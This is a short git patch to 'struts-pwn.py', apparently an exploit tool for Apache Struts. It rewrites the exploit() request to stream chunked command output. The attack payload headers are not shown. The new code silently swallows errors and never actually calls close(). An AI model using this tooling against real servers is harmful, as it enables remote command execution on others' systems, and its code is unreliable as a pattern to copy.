From fce8484e91f042d781af268bcc1bc531e54c6dd6 Mon Sep 17 00:00:00 2001
From: infosechorse <infosechorse@users.noreply.github.com>
Date: Fri, 17 Mar 2017 10:39:49 -0400
Subject: [PATCH] Changed exploit request to utilize Stream for chunked
 encoding responses. Fixes IncompleRead errors.

---
 struts-pwn.py | 17 +++++++++++------
 1 file changed, 11 insertions(+), 6 deletions(-)

diff --git a/struts-pwn.py b/struts-pwn.py
index df93d83..b8db48f 100755
--- a/struts-pwn.py
+++ b/struts-pwn.py
@@ -91,13 +91,18 @@ def exploit(url, cmd):
     }
 
     timeout = 3
+    s = []
     try:
-        output = requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False).text
-    except Exception as e:
-        print("EXCEPTION::::--> " + str(e))
-        output = 'ERROR'
-    return(output)
-
+        output = requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False, stream=True)
+        if output.encoding is None:
+            output.encoding = 'utf-8'
+        for line in output.iter_content(chunk_size=None,decode_unicode=True):
+            s.append(line)
+            command_response = "".join(s)
+        output.close 
+    except:
+        pass
+    return(command_response)
 
 def check(url):
     url = url_prepare(url)
-- 
2.10.1 (Apple Git-78)

